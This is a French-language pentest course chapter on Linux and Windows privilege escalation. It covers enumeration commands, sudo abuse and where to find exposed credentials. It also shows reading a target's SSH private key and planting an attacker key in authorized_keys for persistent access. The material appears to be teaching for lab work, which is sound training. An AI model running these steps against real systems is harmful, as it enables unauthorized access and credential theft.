# Élévation de privilèges

[<< Précédent : Types de shells](05-types-de-shells.md) | [Suivant : Transfert de fichiers >>](07-transfert-de-fichiers.md)

---

## Méthodologie

1. Lancer un script d'énumération automatisée (LinPEAS, WinPEAS, LinEnum)
2. Vérifier les vecteurs dans l'ordre :

| Vecteur | Commandes |
|---------|-----------|
| Privilèges sudo | `sudo -l` |
| Binaires SUID | `find / -perm -4000 2>/dev/null` |
| Kernel exploits | `uname -r` puis `searchsploit` |
| Software vulnérable | `dpkg -l` (Linux), `wmic product get` (Windows) |
| Tâches planifiées | `crontab -l`, `ls /etc/cron*` |
| Credentials exposés | configs, logs, historique bash, clés SSH |

---

## sudo

```bash
sudo -l                               # lister les privilèges
sudo su -                             # passer root
sudo -u user /bin/command              # exécuter en tant qu'autre user
```

`NOPASSWD` = exécution sans mot de passe. Toujours vérifier [GTFOBins](https://gtfobins.github.io) pour les binaires autorisés.

---

## Credentials exposés

Chercher dans :
- Fichiers de config : `/etc/`, configs applicatives
- Historique : `~/.bash_history`
- Clés SSH : `~/.ssh/id_rsa`
- Windows : `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

Toujours tester le **password reuse** (même mot de passe pour plusieurs services/utilisateurs).

---

## Clés SSH

```bash
# Lire une clé privée existante sur la cible
cat /home/user/.ssh/id_rsa

# L'utiliser depuis notre machine
chmod 600 id_rsa
ssh user@TARGET_IP -i id_rsa

# Ou ajouter notre propre clé publique
ssh-keygen -f key
echo "ssh-rsa AAAAB...= user@attacker" >> /home/user/.ssh/authorized_keys
ssh user@TARGET_IP -i key
```

> Voir [cheatsheet privilege-escalation](../../../cheatsheets/privilege-escalation.md) pour les commandes détaillées.
